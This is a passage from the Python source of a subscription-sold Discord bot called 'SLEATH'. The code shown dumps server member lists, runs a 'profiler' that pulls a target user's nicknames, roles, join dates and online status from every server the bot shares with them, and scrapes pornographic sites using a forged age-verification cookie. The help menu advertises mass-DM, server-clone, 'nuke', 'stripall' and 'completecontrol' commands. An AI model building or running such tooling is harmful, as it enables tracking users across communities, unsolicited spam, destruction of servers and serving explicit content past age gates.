    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    lines = [f"# BACKUP — {guild.name} ({guild.id})", f"# {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}", ""]

    lines.append("## ROLES")
    for role in reversed(guild.roles):
        if role.name == "@everyone":
            continue
        lines.append(f"  {role.name} | id:{role.id} | perms:{role.permissions.value} | color:{role.color} | hoist:{role.hoist}")

    lines.append("\n## CHANNELS")
    for cat in guild.categories:
        lines.append(f"\n  [CATEGORY] {cat.name} | id:{cat.id}")
        for ch in cat.channels:
            lines.append(f"    [{ch.type.name.upper()}] #{ch.name} | id:{ch.id}")
    for ch in guild.text_channels:
        if ch.category is None:
            lines.append(f"  [TEXT] #{ch.name} | id:{ch.id}")

    lines.append("\n## MEMBERS (first 100)")
    for member in list(guild.members)[:100]:
        role_names = ", ".join(r.name for r in member.roles if r.name != "@everyone")
        lines.append(f"  {member} | id:{member.id} | roles:[{role_names}]")

    content = "\n".join(lines)
    filename = f"backup_{guild.id}_{datetime.utcnow().strftime('%Y%m%d_%H%M')}.txt"
    file = discord.File(fp=io.BytesIO(content.encode()), filename=filename)
    await ctx.send(f"✓ backup of `{guild.name}`", file=file)


# ── !profiler <user_id> — aggregate user info across all shared servers ────────
@bot.command(name="profiler")
@has_sub("tools")
async def profiler(ctx: commands.Context, user_id: int):
    profile_data = []
    for guild in bot.guilds:
        member = guild.get_member(user_id)
        if not member:
            continue
        role_names = [r.name for r in member.roles if r.name != "@everyone"]
        profile_data.append({
            "guild": guild.name,
            "guild_id": guild.id,
            "nick": member.nick,
            "roles": role_names,
            "joined": member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown",
            "status": str(member.status),
            "bot": member.bot
        })

    if not profile_data:
        await ctx.send(f"user `{user_id}` not found in any shared server."); return

    # fetch basic user info
    try:
        user = await bot.fetch_user(user_id)
        username = str(user)
        created = user.created_at.strftime("%Y-%m-%d")
        avatar = user.display_avatar.url
    except discord.NotFound:
        await ctx.send(f"user `{user_id}` not found."); return

    embed = discord.Embed(title=f"Profile — {username}", color=0x2b2d31)
    embed.set_thumbnail(url=avatar)
    embed.add_field(name="User ID", value=str(user_id))
    embed.add_field(name="Account Created", value=created)
    embed.add_field(name="Shared Servers", value=str(len(profile_data)))

    for entry in profile_data[:5]:  # show first 5 servers
        embed.add_field(
            name=entry["guild"],
            value=(
                f"nick: {entry['nick'] or 'none'}\n"
                f"joined: {entry['joined']}\n"
                f"roles: {', '.join(entry['roles'][:5]) or 'none'}\n"
                f"status: {entry['status']}"
            ),
            inline=True
        )

    if len(profile_data) > 5:
        embed.set_footer(text=f"...and {len(profile_data) - 5} more servers")

    await ctx.send(embed=embed)


# ── !raidwatch <guild_id> <on|off> — monitor join velocity ────────────────────
# simple in-memory monitor — alerts when join rate exceeds threshold
_raidwatch_guilds: set[int] = set()
_join_log: dict[int, list[float]] = {}

@bot.event
async def on_member_join(member: discord.Member):
    guild_id = member.guild.id
    if guild_id not in _raidwatch_guilds:
        return
    import time
    now = time.time()
    if guild_id not in _join_log:
        _join_log[guild_id] = []
    _join_log[guild_id].append(now)
    # keep only last 60 seconds
    _join_log[guild_id] = [t for t in _join_log[guild_id] if now - t < 60]
    # alert if 10+ joins in 60 seconds
    if len(_join_log[guild_id]) >= 10:
        # find home guild to send alert
        home = bot.get_guild(HOME_GUILD_ID)
        if home:
            for channel in home.text_channels:
                if channel.permissions_for(home.me).send_messages:
                    await channel.send(
                        f"🚨 **RAID ALERT** — `{member.guild.name}` (`{guild_id}`)\n"
                        f"`{len(_join_log[guild_id])}` joins in the last 60 seconds"
                    )
                    break


@bot.command(name="raidwatch")
@has_sub("tools")
async def raidwatch(ctx: commands.Context, guild_id: int, toggle: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    if toggle.lower() == "on":
        _raidwatch_guilds.add(guild_id)
        await ctx.send(f"✓ raid watch enabled on `{guild.name}` — alerts if 10+ joins/minute")
    elif toggle.lower() == "off":
        _raidwatch_guilds.discard(guild_id)
        _join_log.pop(guild_id, None)
        await ctx.send(f"✓ raid watch disabled on `{guild.name}`")
    else:
        await ctx.send("use `on` or `off`")


# ══════════════════════════════════════════════════════════════════════════════
#  IMAGE / VIDEO SEARCH  (media tier)
# ══════════════════════════════════════════════════════════════════════════════

def _r34_random_pid(pool: int = 200) -> int:
    pages = pool // 100
    return random.randint(0, max(0, pages - 1)) * 100


def _r34_search(tags: str, limit: int = 100, pid: int = 0) -> list[dict]:
    url = (
        f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1"
        f"&limit={limit}&pid={pid}&tags={urllib.parse.quote(tags)}"
    )
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read().decode("utf-8"))
    return data if isinstance(data, list) else []


def search_images(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 3, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = []
        for tags in [query.replace(' ', '_'), query.replace(' ', '_') + " sort:score", query.replace(' ', '_').split('_')[0]]:
            posts = _r34_search(tags, limit=pool_size, pid=pid)
            if posts:
                break
        if posts:
            image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
            random.shuffle(image_posts)
            for post in image_posts[:pool_size]:
                results.append({"image": post["file_url"], "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            pid = random.randint(0, 20)
            posts = []
            for tags in [query.replace(' ', '_'), query.replace(' ', '_').split('_')[0]]:
                url = f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit={pool_size}&pid={pid}&tags={urllib.parse.quote(tags)}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    data = json.loads(r.read().decode("utf-8"))
                posts = data.get("post", []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                if posts:
                    break
            image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
            random.shuffle(image_posts)
            for post in image_posts[:pool_size]:
                results.append({"image": post["file_url"], "title": query, "source": f"https://gelbooru.com/index.php?page=post&s=view&id={post.get('id','')}"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            random.shuffle(thumbs)
            for i, thumb in enumerate(thumbs[:pool_size]):
                results.append({"image": thumb, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://xhamster.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'data-thumb_url="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'"imageUrl"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            random.shuffle(thumbs)
            for i, thumb in enumerate(thumbs[:pool_size]):
                results.append({"image": thumb, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://www.pornhub.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


def search_videos(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 5, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = _r34_search(query.replace(' ', '_'), limit=pool_size, pid=pid)
        if posts:
            video_posts = [p for p in posts if p.get("file_url") and p["file_url"].endswith((".mp4", ".webm"))]
            random.shuffle(video_posts)
            for post in video_posts[:pool_size]:
                results.append({"video": post["file_url"], "preview": post.get("preview_url"), "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            vkeys = re.findall(r'href="/view_video\.php\?viewkey=([a-z0-9]+)"', body)
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'data-thumb_url="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            paired = list(zip(vkeys, thumbs, titles)) if titles else list(zip(vkeys, thumbs, [query]*len(vkeys)))
            random.shuffle(paired)
            seen: set[str] = set()
            for vk, thumb, title in paired[:pool_size]:
                if vk in seen: continue
                seen.add(vk)
                results.append({"video": None, "page_link": f"https://www.pornhub.com/view_video.php?viewkey={vk}", "preview": thumb, "title": html.unescape(title), "source": "https://www.pornhub.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            links = re.findall(r'"pageURL"\s*:\s*"(https?://xhamster\.com/videos/[^"]+)"', body)
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            paired = list(zip(links, thumbs, titles)) if titles else list(zip(links, thumbs, [query]*len(links)))
            random.shuffle(paired)
            for link, thumb, title in paired[:pool_size]:
                results.append({"video": None, "page_link": link, "preview": thumb, "title": html.unescape(title), "source": "https://xhamster.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


async def _send_media(ctx: commands.Context, url: str, title: str, query: str):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Referer": "https://www.pornhub.com/", "Accept": "*/*", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1"}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    if len(data) <= DISCORD_FILE_LIMIT:
                        ct = resp.headers.get("Content-Type", "")
                        ext = "mp4" if ("mp4" in ct or url.endswith(".mp4")) else "webm" if "webm" in ct else "gif" if "gif" in ct else "png" if "png" in ct else "jpg"
                        await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=f"{query.replace(' ', '_')[:40]}.{ext}"))
                        return
    except Exception:
        pass
    await ctx.send(url)


@bot.command(name="image")
@has_sub("media")
async def image_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, 1)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    r = results[0]
    if r.get("image"):
        embed = discord.Embed(color=0x2b2d31)
        embed.set_image(url=r["image"])
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"no image found for `{query}`")


@bot.command(name="images")
@has_sub("media")
async def image_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 12))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 `{query}` — {len(results)} image(s)")
    for r in results:
        if r.get("image"):
            embed = discord.Embed(color=0x2b2d31)
            embed.set_image(url=r["image"])
            await ctx.send(embed=embed)


@bot.command(name="imagesave")
@has_sub("media")
async def image_save(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 `{query}` — downloading {len(results)} image(s)")
    async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as session:
        for i, r in enumerate(results, 1):
            url = r.get("image")
            if not url:
                continue
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status != 200:
                        await ctx.send(f"result {i} — HTTP {resp.status}, skipping"); continue
                    data = await resp.read()
                ct = resp.headers.get("Content-Type", "")
                ext = "png" if "png" in ct else "gif" if "gif" in ct else "webp" if "webp" in ct else "jpg"
                await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=f"{query.replace(' ', '_')}_{i}.{ext}"))
            except Exception as e:
                await ctx.send(f"result {i} — error: `{e}`")


@bot.command(name="video")
@has_sub("media")
async def video_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, 1)
    if not results:
        await ctx.send(f"no video results for `{query}`"); return
    r = results[0]
    if r.get("video"):
        await _send_media(ctx, r["video"], (r.get("title") or query), query)
    elif r.get("page_link"):
        embed = discord.Embed(title=r.get("title") or query, url=r["page_link"], color=0x2b2d31)
        if r.get("preview"):
            embed.set_image(url=r["preview"])
        embed.set_footer(text=r.get("source", ""))
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"no video found for `{query}`")


@bot.command(name="videos")
@has_sub("media")
async def video_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, count)
    if not results:
        await ctx.send(f"no video results for `{query}`"); return
    await ctx.send(f"🎬 `{query}` — {len(results)} result(s)")
    for i, r in enumerate(results, 1):
        if r.get("video"):
            await _send_media(ctx, r["video"], (r.get("title") or f"result {i}"), query)
        elif r.get("page_link"):
            embed = discord.Embed(title=r.get("title") or f"result {i}", url=r["page_link"], color=0x2b2d31)
            if r.get("preview"):
                embed.set_image(url=r["preview"])
            embed.set_footer(text=r.get("source", ""))
            await ctx.send(embed=embed)


@bot.command(name="imgsearch")
@commands.is_owner()
@home_only()
async def img_debug(ctx: commands.Context, *, query: str):
    await ctx.send("🔍 testing sources...")
    for name, test_url, headers, parse in [
        ("rule34", f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}", {"User-Agent": "Mozilla/5.0"}, lambda b: json.loads(b)),
        ("gelbooru", f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}", {"User-Agent": "Mozilla/5.0"}, lambda b: json.loads(b)),
    ]:
        try:
            req = urllib.request.Request(test_url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as r:
                data = parse(r.read().decode("utf-8"))
            posts = data if isinstance(data, list) else data.get("post", [])
            if posts:
                fu = posts[0].get("file_url", "none")
                await ctx.send(f"{name} ✓ — `{fu[:120]}`")
            else:
                await ctx.send(f"{name} ✓ but empty for `{query}`")
        except Exception as e:
            await ctx.send(f"{name} ✗ — `{e}`")

    try:
        url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read().decode("utf-8", errors="ignore")
        thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
        thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
        if thumbs:
            await ctx.send(f"pornhub ✓ — `{len(thumbs)}` thumbs — `{thumbs[0][:120]}`")
        else:
            await ctx.send(f"pornhub ✓ connected, 0 thumbs")
    except Exception as e:
        await ctx.send(f"pornhub ✗ — `{e}`")


# ══════════════════════════════════════════════════════════════════════════════
#  HELP
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="cmds")
async def show_commands(ctx: commands.Context):
    is_owner = ctx.author.id == OWNER_ID
    sub = subscriptions.get(ctx.author.id)
    now = datetime.now(timezone.utc)
    tier = sub["tier"] if sub and sub["expires"] > now else None

    embed = discord.Embed(title="SLEATH — commands", color=0x2b2d31)

    embed.add_field(name="── public ──", value=(
        "`!plans` — view subscription tiers\n"
        "`!redeem <token>` — activate a subscription\n"
        "`!mysub` — check your subscription status"
    ), inline=False)

    if tier in ("media", "tools") or is_owner:
        embed.add_field(name="── media tier ──", value=(
            "`!image <query>` — 1 image inline\n"
            "`!images <count> <query>` — up to 12 images\n"
            "`!imagesave <count> <query>` — download + re-upload\n"
            "`!video <query>` — 1 video\n"
            "`!videos <count> <query>` — up to 6 videos"
        ), inline=False)

    if tier == "tools" or is_owner:
        embed.add_field(name="── tools tier ──", value=(
            "`!massdm <guild_id> <message>` — DM every member of a server\n"
            "`!cloneserver <guild_id>` — clone a server's structure\n"
            "`!backup <guild_id>` — snapshot roles + channels to file\n"
            "`!profiler <user_id>` — aggregate user info across shared servers\n"
            "`!raidwatch <guild_id> <on|off>` — alert on raid-level join spikes"
        ), inline=False)

    if is_owner:
        embed.add_field(name="── owner — server control ──", value=(
            "`!servers` `!serverinfo` `!channels` `!members` `!roles`\n"
            "`!say` `!announce` `!invite` `!leave` `!nuke` `!openall`\n"
            "`!kick` `!ban` `!unban` `!nick` `!addrole` `!removerole`\n"
            "`!makerole` `!stripall` `!delete` `!purge` `!slowmode`\n"
            "`!read` `!finduser` `!finduserhere`\n"
            "`!completecontrol` `!killswitch`\n"
            "`!gentoken <tier> <days>` `!listsubs` `!revoke <user_id>`"
        ), inline=False)

    await ctx.send(embed=embed)


# ── run ────────────────────────────────────────────────────────────────────────
bot.run(TOKEN)
